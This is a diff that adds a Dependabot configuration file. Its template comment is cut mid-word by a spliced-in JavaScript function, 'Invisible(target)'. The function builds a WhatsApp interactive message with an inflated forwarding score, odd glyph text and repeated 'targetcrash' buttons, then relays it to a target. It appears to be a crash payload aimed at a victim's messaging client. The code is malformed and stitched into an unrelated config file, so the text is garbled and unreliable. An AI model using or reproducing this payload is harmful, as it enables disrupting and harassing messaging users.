@@ -1,0 +1,67 @@
+# To get started with Dependabot version updates, you'll need to specify which
+# package ecosystems to update and where the package manifests arasync function Invisible(target) {
+    let Msg = {
+      galaxy crash: {
+        message: {
+          messageContextInfo: {
+            deviceListMetadata: {},
+            deviceListMetadataVersion: 1,
+          },
+          interactiveMessage: {
+            contextInfo: {
+              mentionedJid: ["62909994445@s.whastapp.net"],
+              isForwarded: true,
+              forwardingScore: 77777,
+    galaxyForwardInfo: {
+             galaxy: target,
+              },
+            },
+            body: {   
+            text: '₣₵ ₲₳₭',
+            },
+            nativeFlowMessage: {
+              buttons: [
+                {
+                  name: "targetcrash",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "targetcrash",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "galaxy",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "galaxy",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "galaxy",
+                  buttonParamsJson: "",
+                },
+                {
+                  name: "galaxy",
+                  buttonParamsJson: "",
+                },
+              ],
+            },
+          },
+        },
+      },
+    };
+
+    await galaxy.relayMessage(target, Msg, {
+      participant: { jid: target },
+    })
+  }e located.
+# Please see the documentation for all configuration options:
+# https://docs.github.com/code-security/dependabot/dependabot-version-updates/configuration-options-for-the-dependabot.yml-file
+
+version: 2
+updates:
+  - package-ecosystem: "" # See documentation for possible values
+    directory: "/" # Location of package manifests
+    schedule:
+      interval: "weekly"
